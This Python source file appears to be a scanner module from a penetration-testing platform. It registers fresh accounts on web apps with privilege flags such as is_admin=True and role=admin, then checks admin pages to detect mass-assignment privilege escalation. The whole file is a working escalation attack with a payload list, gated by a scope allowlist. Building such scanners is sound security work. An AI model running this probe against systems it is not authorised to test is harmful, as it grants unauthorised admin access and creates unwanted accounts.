"""param-pollution-probe — try common admin-flag parameter names on
authenticated profile/update endpoints to detect "mass assignment" or
"is_admin=True"-style privilege-escalation bugs.

Strategy
--------
1. Register a fresh test account (or use an injected session cookie).
2. Identify candidate update endpoints — try common URL patterns.
3. POST a profile update WITHOUT the admin flag → record baseline.
4. POST again WITH `is_admin=True` (and variants) → compare response.
5. Verify admin context: try to GET an admin-only endpoint.
6. If the admin endpoint returns content that the non-admin can't see,
   that's a CRITICAL privilege-escalation finding.

This is the "Gruyere R1" attack — also works against many Python/Django/
Rails apps that use mass-assignment patterns.
"""
from __future__ import annotations

import json
import logging
import random
import re
import string
from typing import Any
from urllib.parse import urljoin, urlparse

import httpx as httpx_client

from api.app.services.auth_discoverer import (
    fetch_auth_pages,
    fingerprint_application,
)
from api.app.services.runs import web_target_value_is_allowed_with_path
from workers.runners._path_augmentation import paths_for_stack
from workers.runners.base.contracts import EvidenceArtifact, RunnerExecution

logger = logging.getLogger(__name__)

RUNNER_NAME = "param-pollution-probe"
RESULTS_ARTIFACT_NAME = "param-pollution-results.json"
DEFAULT_TIMEOUT = 15.0
MAX_BODY_BYTES = 4096

# Common parameter names that grant elevated privileges via mass-assignment
ADMIN_FLAG_PARAMS: tuple[tuple[str, str], ...] = (
    ("is_admin", "True"),
    ("is_admin", "true"),
    ("is_admin", "1"),
    ("admin", "True"),
    ("admin", "true"),
    ("admin", "1"),
    ("is_superuser", "True"),
    ("is_superuser", "true"),
    ("is_staff", "True"),
    ("is_author", "True"),       # Gruyere uses this too
    ("role", "admin"),
    ("user_type", "admin"),
    ("user_role", "admin"),
    ("permission_level", "10"),
    ("access_level", "admin"),
    ("group", "admin"),
)

# Admin-only endpoints to verify access after potential escalation.
# `manage.gtl` (Gruyere) and `manage` (generic) probe the same admin
# concept on different stacks — kept as a generic catalog.
ADMIN_VERIFY_ENDPOINTS: tuple[str, ...] = (
    "manage.gtl",
    "manage",
    "admin",
    "admin/users",
    "",
)

ADMIN_INDICATORS: tuple[str, ...] = (
    "manage this server",   # Gruyere admin link on home
    "admin-only",
    "all users",
    "delete user",
    "manage users",
    "user list",
    "administrator panel",
)


def _artifact(payload: dict[str, Any]) -> EvidenceArtifact:
    return EvidenceArtifact(
        name=RESULTS_ARTIFACT_NAME,
        content_type="application/json",
        data=(json.dumps(payload, sort_keys=True) + "\n").encode("utf-8"),
        kind="runner-results",
    )


def _random_creds() -> tuple[str, str]:
    suffix = "".join(random.choices(string.ascii_lowercase + string.digits, k=8))
    return f"aegispt_{suffix}", f"pp_{suffix}_xy3"


def _path_root(target: str) -> str:
    """Strip trailing filename to get directory-style URL prefix."""
    parsed = urlparse(target)
    if not parsed.path or parsed.path == "/":
        return target.rstrip("/") + "/"
    if not parsed.path.endswith("/"):
        return target.rsplit("/", 1)[0] + "/"
    return target


def _discover_register_form(
    base: str, scope_allowlist: dict[str, Any] | None
) -> dict[str, Any] | None:
    """Migration #328: replaces hardcoded saveprofile/register/signup
    URL list with generic discovery via auth_discoverer.fetch_auth_pages
    + fingerprint_application.

    Returns a dict::

        {
            "action": str,        # full URL the form posts/gets to
            "method": "GET"|"POST",
            "user_field": str,    # name of the username/email field
            "pass_field": str,    # name of the password field
            "hidden_fields": {name: value, ...},  # hidden inputs to replay
        }

    or ``None`` if no register form was observable on the target.
    """
    pages = fetch_auth_pages(base, scope_allowlist=scope_allowlist)
    if not pages:
        return None
    fingerprint = fingerprint_application(pages)
    reg = fingerprint.get("register_form")
    if not isinstance(reg, dict):
        return None
    fields = reg.get("fields") or []

    user_field: str | None = None
    pass_field: str | None = None
    for field in fields:
        fname = str(field.get("name") or "")
        ftype = str(field.get("type") or "").lower()
        if not fname:
            continue
        if ftype == "password" and pass_field is None:
            pass_field = fname
        elif ftype in {"text", "email", ""} and user_field is None:
            user_field = fname

    if not user_field or not pass_field:
        return None

    # Pull hidden-input original values from the raw HTML — fingerprint
    # strips field.value for size, but the param-pollution attack needs
    # to replay original __VIEWSTATE / action=new style hidden inputs.
    hidden_fields: dict[str, str] = {}
    action = reg.get("action") or ""
    for page in pages:
        if not isinstance(page, dict):
            continue
        html = page.get("html") or ""
        if action.split("/")[-1] not in html and reg.get("action") not in html:
            # Skip pages whose form doesn't match the chosen register action.
            pass
        # Cheap hidden-field extraction (we have the form html nearby).
        for match in re.finditer(
            r'<input[^>]*\btype=["\']hidden["\'][^>]*>', html, re.IGNORECASE
        ):
            tag = match.group(0)
            n_match = re.search(r'\bname=["\']([^"\']*)["\']', tag, re.IGNORECASE)
            v_match = re.search(r'\bvalue=["\']([^"\']*)["\']', tag, re.IGNORECASE)
            if n_match:
                hidden_fields.setdefault(n_match.group(1), v_match.group(1) if v_match else "")

    return {
        "action": action,
        "method": str(reg.get("method") or "POST").upper(),
        "user_field": user_field,
        "pass_field": pass_field,
        "hidden_fields": hidden_fields,
    }


def _check_admin_access(
    client: httpx_client.Client,
    base: str,
    *,
    stack_hints: list[str] | None = None,
) -> tuple[bool, str, str]:
    """Check if the client's cookie jar grants admin access.

    #338 — augment ADMIN_VERIFY_ENDPOINTS with stack-specific paths
    (e.g. /elmah.axd for aspnet, /admin/console.jsp for java_jsp, etc.)
    when stack_hints is supplied.
    """
    augmented_paths: tuple[str, ...] = ADMIN_VERIFY_ENDPOINTS + tuple(
        path for path, _label in paths_for_stack(stack_hints, "debug-dump")
    )
    for path in augmented_paths:
        url = urljoin(base, path)
        try:
            resp = client.get(url, follow_redirects=False)
        except httpx_client.RequestError:
            continue
        body_lower = (resp.text or "").lower()[:MAX_BODY_BYTES]
        if resp.status_code == 200 and any(ind in body_lower for ind in ADMIN_INDICATORS):
            return True, url, (resp.text or "")[:300]
    return False, "", ""


def execute_param_pollution_probe(
    targets: list[str] | list[dict[str, Any]],
    *,
    scope_allowlist: dict[str, Any] | None = None,
    injected_cookies: dict[str, str] | None = None,
    timeout_seconds: float = DEFAULT_TIMEOUT,
    stack_hints: list[str] | None = None,
) -> RunnerExecution:
    findings_payload: list[dict[str, Any]] = []
    trace: list[dict[str, Any]] = []
    stderr_lines: list[str] = []

    web_targets: list[str] = []
    for t in targets:
        if isinstance(t, str):
            if t.strip().lower().startswith(("http://", "https://")):
                web_targets.append(t.strip())
        elif isinstance(t, dict):
            kind = str(t.get("kind") or "").lower()
            value = str(t.get("value") or "").strip()
            if kind == "url" and value:
                web_targets.append(value)
    if not web_targets:
        return RunnerExecution(
            tool=RUNNER_NAME, exit_code=2, stdout=json.dumps({"trace": []}),
            stderr="no web targets supplied",
            metadata={"status": "skip"},
            artifacts=[_artifact({"trace": []})], protected_outputs=[],
        )

    for target in web_targets:
        base = _path_root(target)
        trace_entry: dict[str, Any] = {"target": target, "base": base, "steps": []}

        # Migration #328: discover the register form GENERICALLY rather
        # than hardcoding saveprofile + uid/pw field names.
        form_info = _discover_register_form(base, scope_allowlist)
        if form_info is None:
            trace_entry["steps"].append({"step": "register_discovery", "result": "no_form_found"})
            trace.append(trace_entry)
            continue

        register_url = form_info["action"]
        register_method = form_info["method"]
        user_field = form_info["user_field"]
        pass_field = form_info["pass_field"]
        hidden_fields = form_info["hidden_fields"]

        if scope_allowlist and not web_target_value_is_allowed_with_path(scope_allowlist, register_url):
            trace_entry["steps"].append({"step": "register_discovery", "result": "out_of_scope"})
            trace.append(trace_entry)
            continue

        trace_entry["steps"].append({
            "step": "register_discovery",
            "action": register_url,
            "user_field": user_field,
            "pass_field": pass_field,
            "hidden_field_names": list(hidden_fields),
        })

        attack_done = False
        for param_name, param_value in ADMIN_FLAG_PARAMS:
            if attack_done:
                break
            uid, pw = _random_creds()
            with httpx_client.Client(timeout=timeout_seconds, follow_redirects=False) as client:
                # Register a fresh account WITH the admin-flag param attached.
                # Field names come from the discovered form, not Gruyere hardcoded.
                register_params: dict[str, str] = {
                    **hidden_fields,
                    user_field: uid,
                    pass_field: pw,
                    param_name: param_value,
                }
                try:
                    if register_method == "GET":
                        resp = client.get(register_url, params=register_params, follow_redirects=False)
                    else:
                        resp = client.request(
                            register_method,
                            register_url,
                            data=register_params,
                            follow_redirects=False,
                        )
                except httpx_client.RequestError:
                    continue
                if resp.status_code not in (200, 302):
                    continue
                if len(client.cookies) == 0:
                    # Some stacks require a follow-up login to set the cookie.
                    try:
                        client.request(
                            register_method,
                            register_url,
                            params={user_field: uid, pass_field: pw} if register_method == "GET" else None,
                            data={user_field: uid, pass_field: pw} if register_method != "GET" else None,
                        )
                    except httpx_client.RequestError:
                        pass
                if len(client.cookies) == 0:
                    continue
                is_admin, admin_url, evidence = _check_admin_access(
                    client, base, stack_hints=stack_hints,
                )
                trace_entry["steps"].append({
                    "step": "register_with_polluted_param",
                    "endpoint": register_url,
                    "param": param_name,
                    "value": param_value,
                    "uid": uid,
                    "status": resp.status_code,
                    "cookie_keys": list(client.cookies.keys()),
                    "is_admin_after": is_admin,
                })
                if is_admin:
                    findings_payload.append({
                        "title": f"Privilege Escalation via Mass Assignment at Registration ({param_name}={param_value})",
                        "severity": "critical",
                        "category": "broken-access-control",
                        "target_id": register_url,
                        "evidence": {
                            "exploited_endpoint": register_url,
                            "polluted_param": param_name,
                            "polluted_value": param_value,
                            "admin_endpoint_reachable": admin_url,
                            "admin_response_excerpt": evidence,
                            "user": uid,
                        },
                    })
                    stderr_lines.append(
                        f"CRITICAL: {param_name}={param_value} on {register_url} → admin via {admin_url}"
                    )
                    attack_done = True
                    break
        trace.append(trace_entry)

    result = {"trace": trace, "findings": findings_payload, "trace_count": len(trace)}
    if findings_payload:
        stderr_lines.append(f"flagged {len(findings_payload)} privilege-escalation finding(s)")

    return RunnerExecution(
        tool=RUNNER_NAME,
        exit_code=0,
        stdout=json.dumps(result),
        stderr="\n".join(stderr_lines),
        metadata={
            "status": "ok",
            "tool_version": f"{RUNNER_NAME}:v1",
            "findings_count": len(findings_payload),
        },
        artifacts=[_artifact(result)],
        protected_outputs=[],
    )
